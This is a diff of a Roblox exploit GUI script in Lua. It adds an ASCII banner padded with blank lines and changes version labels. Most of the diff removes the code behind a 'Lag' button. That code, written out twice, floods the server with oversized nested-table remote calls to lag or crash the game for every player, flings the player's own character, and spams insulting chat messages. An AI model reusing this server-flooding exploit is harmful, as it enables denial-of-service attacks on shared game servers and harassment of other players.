@@ -1,8 +1,40 @@
--- Gui to Lua
--- Version: 3.2
+--[[
 
--- Instances:
+ ____               _       _                      __                  _                      ____   __   __    ____     ____    ___    ____    ____    ___    ___    _   _ 
+ |  _ \    ___    __| |   __| |  _   _   _ __      / _|  _   _    ___  | | __   ___   _ __    | __ )  \ \ / /   / ___|   / ___|  / _ \  |  _ \  |  _ \  |_ _|  / _ \  | \ | |
+ | |_) |  / _ \  / _` |  / _` | | | | | | '_ \    | |_  | | | |  / __| | |/ /  / _ \ | '__|   |  _ \   \ V /    \___ \  | |     | | | | | |_) | | |_) |  | |  | | | | |  \| |
+ |  _ <  |  __/ | (_| | | (_| | | |_| | | | | |   |  _| | |_| | | (__  |   <  |  __/ | |      | |_) |   | |      ___) | | |___  | |_| | |  _ <  |  __/   | |  | |_| | | |\  |
+ |_| \_\  \___|  \__,_|  \__,_|  \__, | |_| |_|   |_|    \__,_|  \___| |_|\_\  \___| |_|      |____/    |_|     |____/   \____|  \___/  |_| \_\ |_|     |___|  \___/  |_| \_|
+                                 |___/                                                                                                                                       
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+]]--
+-- v 1.4
 local Screen = Instance.new("ScreenGui")
 local reddyneocaralho = Instance.new("Frame")
 local Acao2 = Instance.new("TextButton")
@@ -125,7 +157,7 @@ TextLabel_2.Position = UDim2.new(0.754327774, 0, 0.482993782, 0)
 TextLabel_2.Rotation = 7.000
 TextLabel_2.Size = UDim2.new(0.121497661, 0, 0.0621343777, 0)
 TextLabel_2.Font = Enum.Font.Gotham
-TextLabel_2.Text = "v1.2"
+TextLabel_2.Text = "v1.4"
 TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
 TextLabel_2.TextScaled = true
 TextLabel_2.TextSize = 14.000
@@ -136,14 +168,14 @@ UIGradient_2.Parent = TextLabel_2
 
 -- Scripts:
 
-local function PFKLN_fake_script() -- Screen.LocalScript 
+local function DUYLTS_fake_script() -- Screen.LocalScript 
 	local script = Instance.new('LocalScript', Screen)
 
 	--
 	script.Parent.reddyneocaralho.Musica.MouseButton1Down:Connect(function()
 	    local sound = true 
-		local ID = "rbxassetid://5647277440" 
-		local Name = "ambiente" 
+		local ID = "rbxassetid://6845637094" 
+		local Name = "Ambiente" 
 		local Volume = 100 
 		local Pitch = 1 
 	
@@ -170,134 +202,7 @@ local function PFKLN_fake_script() -- Screen.LocalScript
 	end)
 	--
 	script.Parent.reddyneocaralho.Lag.MouseButton1Click:Connect(function()
-		local char = game:GetService('Players').LocalPlayer.Character or nil
-		if char then
-			char.HumanoidRootPart.CFrame = CFrame.new(0,9e9,0)
-			task.wait(0.5)
-			char.HumanoidRootPart.Anchored = true
-		end
-		while wait(1.5) do --// don't change it's the best
-			game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
-			local function getmaxvalue(val)
-				local mainvalueifonetable = 499999
-				if type(val) ~= "number" then
-					return nil
-				end
-				local calculateperfectval = (mainvalueifonetable/(val+2))
-				return calculateperfectval
-			end
-	
-			local function bomb(tableincrease, tries)
-				local maintable = {}
-				local spammedtable = {}
-	
-				table.insert(spammedtable, {})
-				z = spammedtable[1]
-	
-				for i = 1, tableincrease do
-					local tableins = {}
-					table.insert(z, tableins)
-					z = tableins
-				end
-	
-				local calculatemax = getmaxvalue(tableincrease)
-				local maximum
-	
-				if calculatemax then
-					maximum = calculatemax
-				else
-					maximum = 999999
-				end
-	
-				for i = 1, maximum do
-					table.insert(maintable, spammedtable)
-				end
-	
-				for i = 1, tries do
-					game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
-				end
-			end
-	
-			bomb(289, 5) --// change values if client crashes
-		end
 		
-		for _,s in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
-			if s:IsA("Motor6D") and s.Name ~= "Neck" then
-				local fard = s.Parent
-				s:Destroy()
-				fard.CFrame = CFrame.new(9e9 * _,9e9* _,9e9*_)
-				wait()
-			end
-		end
-		
-		--[[
-	
-	███╗   ███╗ █████╗ ██████╗ ██╗   ██╗ ██████╗ ██████╗ ██╗    ██╗ █████╗ ██████╗ ███████╗
-	████╗ ████║██╔══██╗██╔══██╗██║   ██║██╔════╝██╔═══██╗██║    ██║██╔══██╗██╔══██╗██╔════╝
-	██╔████╔██║███████║██████╔╝██║   ██║██║     ██║   ██║██║ █╗ ██║███████║██████╔╝█████╗
-	██║╚██╔╝██║██╔══██║██╔══██╗╚██╗ ██╔╝██║     ██║   ██║██║███╗██║██╔══██║██╔══██╗██╔══╝
-	██║ ╚═╝ ██║██║  ██║██║  ██║ ╚████╔╝ ╚██████╗╚██████╔╝╚███╔███╔╝██║  ██║██║  ██║███████╗
-	╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝   ╚═════╝ ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
-	
-	]]--
-		local char = game:GetService('Players').LocalPlayer.Character or nil
-		if char then
-			char.HumanoidRootPart.CFrame = CFrame.new(0,9e9,0)
-			task.wait(0.5)
-			char.HumanoidRootPart.Anchored = true
-		end
-		while wait(1.5) do --// don't change it's the best
-			game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
-			local function getmaxvalue(val)
-				local mainvalueifonetable = 499999
-				if type(val) ~= "number" then
-					return nil
-				end
-				local calculateperfectval = (mainvalueifonetable/(val+2))
-				return calculateperfectval
-			end
-	
-			local function bomb(tableincrease, tries)
-				local maintable = {}
-				local spammedtable = {}
-	
-				table.insert(spammedtable, {})
-				z = spammedtable[1]
-	
-				for i = 1, tableincrease do
-					local tableins = {}
-					table.insert(z, tableins)
-					z = tableins
-				end
-	
-				local calculatemax = getmaxvalue(tableincrease)
-				local maximum
-	
-				if calculatemax then
-					maximum = calculatemax
-				else
-					maximum = 999999
-				end
-	
-				for i = 1, maximum do
-					table.insert(maintable, spammedtable)
-				end
-	
-				for i = 1, tries do
-					game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
-				end
-			end
-	
-			bomb(289, 5) --// change values if client crashes
-		end
-		local phrases = {"marvco4362 | my server is .gg/soggy join it for the script", "marvco4362 | im lagging this server i hate all of you", "marvco4362 | together we can get rid of all the script kiddies"}
-	
-		while true do
-			for i = 1, 5 do
-				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(phrases[i], "All")
-				wait(2.25)
-			end
-		end
 	end)
 end
-coroutine.wrap(PFKLN_fake_script)()
+coroutine.wrap(DUYLTS_fake_script)()
